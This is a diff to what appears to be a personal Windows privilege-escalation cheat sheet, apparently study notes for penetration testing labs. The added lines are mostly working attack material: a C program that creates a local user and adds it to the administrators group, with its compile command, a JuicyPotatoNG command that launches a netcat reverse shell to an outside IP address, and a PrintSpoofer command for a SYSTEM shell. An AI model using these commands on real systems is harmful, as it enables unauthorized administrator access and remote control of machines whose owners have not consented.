@@ -34,6 +34,18 @@ ___
 
 * `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
 
+```c++
+#include <stdlib.h>
+int main () {
+    int i;
+    i = system ("net user dave2 password123! /add");
+    i = system ("net localgroup administrators dave2 /add");
+    return 0;
+}
+```
+
+And compile it: `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+
 ___
 
 ### DLL Hijack
@@ -111,4 +123,16 @@ LPVOID lpReserved ) // Reserved
     }
     return TRUE;
 }
+```
+
+### Privesc with SeImpersonatePrivilege
+
+[Hacktricks Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege-3.1.1)
+
+```cmd
+C:\Users\Public> .\JuicyPotatoNG.exe -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe 192.168.45.189 80" -t *
+```
+
+```cmd
+C:\Users\Public> .\PrintSpoofer.exe -i -c cmd.exe
 ```
